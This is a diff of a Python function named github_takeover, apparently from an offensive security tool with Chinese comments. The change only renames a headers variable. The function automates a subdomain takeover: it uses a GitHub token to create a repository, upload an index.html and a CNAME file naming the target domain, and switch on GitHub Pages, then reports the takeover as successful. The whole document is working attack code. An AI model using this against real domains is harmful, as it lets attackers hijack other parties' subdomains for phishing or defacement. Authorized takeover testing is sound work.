@@ -23,12 +23,12 @@ def github_takeover(url):
     print('[*]正在读取配置文件')
     user = api.github_api_user
     token = api.github_api_token
-    CHECK_HEADERS = {
+    headers = {
         "Authorization": 'token ' + token,
         "Accept": "application/vnd.github.switcheroo-preview+json"
     }
     repos_url = 'https://api.github.com/repos/' + user + '/' + repo_name
-    repos_r = requests.get(url=repos_url, headers=CHECK_HEADERS)
+    repos_r = requests.get(url=repos_url, headers=headers)
     # 验证token是否正确
     if 'message' in repos_r.json():
         if repos_r.json()['message'] == 'Bad credentials':
@@ -41,7 +41,7 @@ def github_takeover(url):
             }
             creat_repo_url = 'https://api.github.com/user/repos'
             creat_repo_r = requests.post(url=creat_repo_url,
-                                         headers=CHECK_HEADERS,
+                                         headers=headers,
                                          data=json.dumps(creat_repo_dict))
             creat_repo_status = creat_repo_r.status_code
             if creat_repo_status == 201:
@@ -76,9 +76,9 @@ def github_takeover(url):
                 html_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/index.html'
                 url_url = 'https://api.github.com/repos/' + user + '/' + repo_name + '/contents/CNAME'
                 html_r = requests.put(url=html_url, data=json.dumps(html_dict),
-                                      headers=CHECK_HEADERS)  # 上传index.html
+                                      headers=headers)  # 上传index.html
                 cname_r = requests.put(url=url_url, data=json.dumps(url_dict),
-                                       headers=CHECK_HEADERS)  # 上传CNAME
+                                       headers=headers)  # 上传CNAME
                 rs = cname_r.status_code
                 if rs == 201:
                     print('[*]生成接管库成功，正在开启Github pages')
@@ -90,7 +90,7 @@ def github_takeover(url):
                     }
                     page_r = requests.post(url=page_url,
                                            data=json.dumps(page_dict),
-                                           headers=CHECK_HEADERS)  # 开启page
+                                           headers=headers)  # 开启page
                     if page_r.status_code == 201:
                         print('[+]自动接管成功，请稍后访问http://' + str(url) + '查看结果')
                     else:
